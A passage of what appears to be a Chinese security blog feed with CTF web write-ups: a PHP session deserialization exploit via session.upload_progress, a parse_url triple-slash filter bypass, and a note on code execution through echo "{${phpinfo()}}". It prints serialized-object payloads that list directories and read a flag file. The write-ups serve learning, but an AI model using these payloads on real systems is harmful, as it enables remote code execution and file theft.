class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单看一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);   设定上述存储方式为php</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>__construct()   php中的魔法函数   实例化对象时被调用</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>__destruct()     php中的魔法函数  当删除一个对象或对象操作终止时被调用</span><br><span class="line"></span><br><span class="line">注：常见反序列化中魔法函数中还有</span><br><span class="line"></span><br><span class="line">__sleep()   serialize之前被调用</span><br><span class="line"></span><br><span class="line">__wakeup()   unserialize时被调用</span><br></pre></td></tr></table></figure><p>由此可见，我们只要简单_GET一个’phpinfo’ 就会执行<code>$m = new OowoO();</code>同时就会调用<code>__construct()</code>函数得到phpinfo()页面，先看看phpinfo页面能提供什么信息，有如下四点:</p><p><img src="https://myndtt.github.io%5Cimages%5C47.png" alt="47"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一.php页面通过ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>)对存储方式进行了修改。</span><br><span class="line"></span><br><span class="line">二.php版本为<span class="number">5.6</span>.<span class="number">21</span></span><br><span class="line"></span><br><span class="line">三.网站路径为 /opt/lampp/htdocs</span><br><span class="line"></span><br><span class="line">四<span class="selector-class">.session</span><span class="selector-class">.upload_progress</span><span class="selector-class">.enabled</span> 为on(关键)</span><br></pre></td></tr></table></figure><p>当然我们实际要执行<code>__destruct()</code>函数才能解决问题,，不用担心，对象操作一定会终止，也即这个函数一定会运行，接下就是如何利用了。</p><h2 id="0x03-安静的伸张"><a href="#0x03-安静的伸张" class="headerlink" title="0x03.安静的伸张"></a>0x03.安静的伸张</h2><p>方式：</p><p>我们可以<code>想办法</code>在session全局变量中加入一个变量，此变量经过<code>php_serialize</code>方式存储，随后该php页面通过<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;)</code>更改存储(反序列化回来)方式，接着执行<code>session_start();</code>对session变量内容全部反序列化回来达到序列化利用。</p><p>而这个<code>想办法</code>就要利用第四点信息–&gt;<code>session.upload_progress.enabled 为on</code>，看看官方解释：</p><p><img src="https://myndtt.github.io%5Cimages%5C48.png" alt="48"></p><p>官方的例子：</p><p><img src="https://myndtt.github.io%5Cimages%5C49.png" alt="49"></p><p>照葫芦画瓢，建立xx.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>上传文件，抓包，修改文件名，修改成我们想要的样子：</p><p><img src="https://myndtt.github.io%5Cimages%5C50.png" alt="50"></p><p>为：<code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:38:&quot;print_r(scandir(&quot;/opt/lampp/htdocs&quot;));&quot;;}</code>但是别忘了存储方式的更改。所以最后文件名字修改为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:38:\"print_r(scandir(\"/opt/lampp/htdocs\"));\";&#125;(加竖杠符合存储要求，叫反斜杠进行转义)</span><br></pre></td></tr></table></figure><p><img src="https://myndtt.github.io%5Cimages%5C51.png" alt="51"></p><p>再次修改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myndtt.github.io%5Cimages%5C52.png" alt="52"></p><p>当然你还可以获取到，额，等等…..</p><p><img src="https://myndtt.github.io%5Cimages%5C53.png" alt="53"></p><p>简单概述过程，即为：使用<code>session.upload_progress</code>在全局session多一个变量如$_session[‘test’],赋值为<code>|123</code>，则通过php_serialize存储为a:1:{s:4:”test”;s:4:”|123”}</p><p>a:1为默认的,s:4:”test”为key，s:4:”|123”为value，而到了index.php,更改了存储方式,以<code>|</code>作为key，value分界线，执行session_start();则123进行了反序列化,而123可控，则可被利用。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04.小结"></a>0x04.小结</h2><p>php内置seesion存储机制需要好好编写使用，别用错了。如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p><p><code>session.upload_progress</code>很IMBA,<a href="http://www.laruence.com/2011/10/10/2217.html" target="_blank" rel="noopener">http://www.laruence.com/2011/10/10/2217.html</a></p><p>参考：<a href="http://www.jb51.net/article/107101.htm(很详细！！！)" target="_blank" rel="noopener">http://www.jb51.net/article/107101.htm(很详细！！！)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-打字机&quot;&gt;&lt;a href=&quot;#0x00-打字机&quot; class=&quot;headerlink&quot; title=&quot;0x00.打字机&quot;&gt;&lt;/a&gt;0x00.打字机&lt;/h2&gt;&lt;p&gt;简单扯一下，大家都知道，几乎所有的编程语言都有(反)序列化这种机制，可以将一些对象，数组等通过&lt;code&gt;某种方式&lt;/code&gt;变成可以便捷传输和存储(后面将提到)的形式，如字符串。当然php也不例外。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://myndtt.github.io%5Cimages%5C43.png&quot; alt=&quot;43&quot;&gt;&lt;/p&gt;
&lt;p&gt;同时在php有一个这样有意思的设置–&amp;gt;&lt;code&gt;php默认的SESSION会话机制 存储在文件系统的会话数据的内容是已经序列化后的内容,程序执行session_start()后PHP会自动读取文件并unserialize反序列化成数组赋值给超全局变量$_SESSION&lt;/code&gt; (这句话是没错的)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://myndtt.github.io%5Cimages%5C44.png&quot; alt=&quot;44&quot;&gt;&lt;/p&gt;
&lt;p&gt;​       &lt;code&gt;(session_register这个函数功能即是可以在全部变量中session定义一个新的变量)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="php" scheme="https://myndtt.github.io/tags/php/"/>
    
      <category term="web" scheme="https://myndtt.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>parse_url</title>
    <link href="https://myndtt.github.io/2017/12/07/parse-url/"/>
    <id>https://myndtt.github.io/2017/12/07/parse-url/</id>
    <published>2017-12-07T13:29:31.000Z</published>
    <updated>2019-09-22T05:04:46.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>又是一道关于parse_url的题目，上次也说了一道<a href="http://myndtt.com/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/" target="_blank" rel="noopener">http://myndtt.com/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/</a></p><h2 id="0x01-开门见山"><a href="#0x01-开门见山" class="headerlink" title="0x01.开门见山"></a>0x01.开门见山</h2><p>题目都没什么稀奇的，题目链接：<a href="http://solveme.safflower.kr/prob/url_filtering/" target="_blank" rel="noopener">http://solveme.safflower.kr/prob/url_filtering/</a></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">    <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = <span class="string">""</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-循序渐进"><a href="#0x02-循序渐进" class="headerlink" title="0x02.循序渐进"></a>0x02.循序渐进</h2><p>在分析题目之前，首先需要说一下其他的知识。</p><h3 id="URI与URL"><a href="#URI与URL" class="headerlink" title="URI与URL"></a>URI与URL</h3><p>URI,全称<code>uniform resource identifier</code>统一资源标识符，用来唯一标识一个资源，同时可以代表相对的绝对的的一个资源信息。</p><p>URL似乎我们比较熟悉,全称<code>uniform resource locator</code>统一资源定位器，需要定位资源的具体信息，不可以是相对的。</p><p>在php中有如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/aaa/index.php</span></span><br><span class="line">结果：</span><br><span class="line">$_SERVER[<span class="string">'QUERY_STRING'</span>] = <span class="string">""</span>;</span><br><span class="line">$_SERVER[<span class="string">'REQUEST_URI'</span>]  = <span class="string">"/aaa/"</span>;</span><br><span class="line">$_SERVER[<span class="string">'SCRIPT_NAME'</span>]  = <span class="string">"/aaa/index.php"</span>;</span><br><span class="line">$_SERVER[<span class="string">'PHP_SELF'</span>]     = <span class="string">"/aaa/index.php"</span>;</span><br></pre></td></tr></table></figure><h3 id="Parse-url"><a href="#Parse-url" class="headerlink" title="Parse_url"></a>Parse_url</h3><p>函数原型<code>mixed parse_url ( string $url [, int $component = -1 ] )</code></p><p>按php文档的解释就是该函数专门解析URL的。</p><p><img src="https://myndtt.github.io%5Cimages%5C40.png" alt="40"></p><p>同时这个函数的返回值可能是false</p><p><img src="https://myndtt.github.io%5Cimages%5C41.png" alt="41"></p><h3 id="回到代码"><a href="#回到代码" class="headerlink" title="回到代码"></a>回到代码</h3><p>代码如下两句首先对我们URI的进行相应解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">$url_query = parse_url($url, PHP_URL_QUERY);</span><br></pre></td></tr></table></figure><p>随后代码对其进行参数及值抽取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入http://xxx.com/1/index.php?a=2</span></span><br><span class="line">$params = explode(<span class="string">"&amp;"</span>, $url_query);  <span class="comment">//得到数组0 =&gt; 2</span></span><br><span class="line">    <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, <span class="string">"="</span>);<span class="comment">//获得参数</span></span><br><span class="line">        <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = <span class="string">""</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $key = substr($param, <span class="number">0</span>, $idx_equal);<span class="comment">//参数a</span></span><br><span class="line">            $value = substr($param, $idx_equal + <span class="number">1</span>);<span class="comment">//参数值 这里值为2</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;<span class="comment">//检测到这样就没了</span></span><br></pre></td></tr></table></figure><p>但是后面又需要我们get提交 do_you_want_flag=yes</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是自相矛盾的，但是上文提到了<code>parse_url</code>是可能返回错误的，这就是关键，一旦错误后面就不会解析。直接跳过了,也就不会<code>die(&quot;no hack&quot;);</code>,那么如何返回错误么，老套路，还是看文档。</p><p><img src="https://myndtt.github.io%5Cimages%5C42.png" alt="42"></p><p>这里提到了除了file不能三个<code>///</code>,否则其他都不允许！试试这个。</p><p><a href="http://solveme.safflower.kr///prob/url_filtering/index.php?do_you_want_flag=yes" target="_blank" rel="noopener">http://solveme.safflower.kr///prob/url_filtering/index.php?do_you_want_flag=yes</a></p><p>果然。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03.总结"></a>0x03.总结</h2><p>说起来就是一个<code>parse_url</code>的解析错误，翻翻文档就可以了，但是我想思路就是琢磨出来的，有时灵感一现就有了，但有时也会困惑，但不管怎样遇到问题看文档总是一个正确的选择，无论是php还是mysql。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;又是一道关于parse_url的题目，上次也说了一道&lt;a href=&quot;http://myndtt.com/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://myndtt.com/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-开门见山&quot;&gt;&lt;a href=&quot;#0x01-开门见山&quot; class=&quot;headerlink&quot; title=&quot;0x01.开门见山&quot;&gt;&lt;/a&gt;0x01.开门见山&lt;/h2&gt;&lt;p&gt;题目都没什么稀奇的，题目链接：&lt;a href=&quot;http://solveme.safflower.kr/prob/url_filtering/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://solveme.safflower.kr/prob/url_filtering/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;__DIR__&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;/lib.php&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $url = urldecode($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REQUEST_URI&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $url_query = parse_url($url, PHP_URL_QUERY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $params = explode(&lt;span class=&quot;string&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;, $url_query);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($params &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $param)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $idx_equal = strpos($param, &lt;span class=&quot;string&quot;&gt;&quot;=&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($idx_equal === &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $key = $param;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $value = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $key = substr($param, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, $idx_equal);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $value = substr($param, $idx_equal + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strpos($key, &lt;span class=&quot;string&quot;&gt;&quot;do_you_want_flag&quot;&lt;/span&gt;) !== &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt; || strpos($value, &lt;span class=&quot;string&quot;&gt;&quot;yes&quot;&lt;/span&gt;) !== &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;no hack&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;do_you_want_flag&#39;&lt;/span&gt;]) &amp;amp;&amp;amp; $_GET[&lt;span class=&quot;string&quot;&gt;&#39;do_you_want_flag&#39;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&quot;yes&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;($flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="php" scheme="https://myndtt.github.io/tags/php/"/>
    
      <category term="web" scheme="https://myndtt.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>problem&amp;solution</title>
    <link href="https://myndtt.github.io/2017/12/04/problem&amp;solution/"/>
    <id>https://myndtt.github.io/2017/12/04/problem&amp;solution/</id>
    <published>2017-12-04T06:25:18.000Z</published>
    <updated>2019-09-22T05:04:46.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>这完全是一篇水文，只是记录了一下平时遇到的一些问题及查找到的解决方法。</p><h2 id="0x01-琴声悠悠"><a href="#0x01-琴声悠悠" class="headerlink" title="0x01.琴声悠悠"></a>0x01.琴声悠悠</h2><h3 id="一-echo-“-phpinfo-”可以输出php环境"><a href="#一-echo-“-phpinfo-”可以输出php环境" class="headerlink" title="一.echo “{${phpinfo()}}”可以输出php环境"></a>一.echo “{${phpinfo()}}”可以输出php环境</h3><p>这个问题很早以前就有人提出来了，但是一直都没什么人解答，我其实也不知道真实的情况具体是什么，只是根据测试去推测可能是什么。</p><h4 id="1-phpinfo"><a href="#1-phpinfo" class="headerlink" title="1.phpinfo()"></a>1.phpinfo()</h4><p>首先phpinfo()函数是php的内置函数，函数原型是</p><p><img src="https://myndtt.github.io/images/36.png" alt="36"></p><a id="more"></a><p>对，这个函数返回值是一个布尔类型，但是它是可以输出配置环境的。</p><p><img src="https://myndtt.github.io/images/37.png" alt="37"></p><p><code>可以说只要这个函数得到了调用,只要调用print echo var_dump等函数都可以将php环境信息输出到屏幕上。</code></p><h4 id="2-php变量"><a href="#2-php变量" class="headerlink" title="2.php变量"></a>2.php变量</h4><p><img src="https://myndtt.github.io/images/38.png" alt="38"></p><p>众所周知，php中有效变量由$+变量名字组成，变量名字必须为<code>(字母或者下划线开头)</code>,除此之外，变量名字可以由其他函数返回值或者变量代替，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$aaa=<span class="string">"man"</span>;</span><br><span class="line">$man=<span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">echo</span> $$aaa;  <span class="comment">//输出hello</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"man"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$man=<span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">echo</span> $&#123;test()&#125;;<span class="comment">//输出hello;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-php双引号中的大括号"><a href="#3-php双引号中的大括号" class="headerlink" title="3.php双引号中的大括号"></a>3.php双引号中的大括号</h4><p>网上对这一部分有了许多解析，简单总结就是一个界定的作用，如上面看到的那样。</p><p><code>${test()}</code> ,这里就将test函数括起来，要求php去执行、解析。</p><p>有了上面三个小问题的简单解释<code>echo &quot;{${phpinfo()}}&quot;</code> 也就没什么了。</p><p>首先在字符串在双引号中，所以最外面一层双引号进行界定分开，表示其中需要解析，然而发现里面是${}结构，则需要解析这个变量名字，也即解析phpinfo()函数，此函数解析又有前面的打印函数，自然将php环境输出至屏幕，而phpinfo()执行成功返回1，不允许这样的变量，页面最后面报错。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo "&#123;$&#123;phpversion()&#125;&#125;"; 